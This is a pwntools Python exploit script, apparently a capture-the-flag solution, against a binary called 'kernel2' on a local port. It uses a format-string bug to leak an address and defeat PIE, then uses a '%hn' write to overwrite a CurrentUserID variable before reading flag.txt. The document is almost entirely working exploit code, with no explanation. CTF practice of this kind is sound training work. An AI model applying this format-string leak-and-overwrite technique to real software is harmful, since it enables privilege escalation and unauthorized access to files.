#!/usr/bin/env python3

from pwn import *

exe = ELF("kernel2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9977)

    return r


def echo(r, string):
    r.recvuntil(b'> ')
    r.sendline(b'echo ' + string)
    return r.recvline()
    
def read(r, file):
    r.recvuntil(b'> ')
    r.sendline(b'read ' + file)


def main():
    r = conn()

    offset = 0x18f2
    exe.address = int(echo(r, b"%3$p"), 16) - offset
    log.info(f'{hex(exe.address)=}')

    CurrentUserID = exe.address + 0x403c     # readelf -a ./kernel2 | grep CurrentUserID
    log.info(f'{hex(CurrentUserID)=}')  

    echo(r, b'...' + p32(CurrentUserID + 2) + p32(CurrentUserID) + b'|' + b'%4907u%14$hn' + b'%15$hn')

    read(r, b'flag.txt')

    r.interactive()

if __name__ == "__main__":
    main()
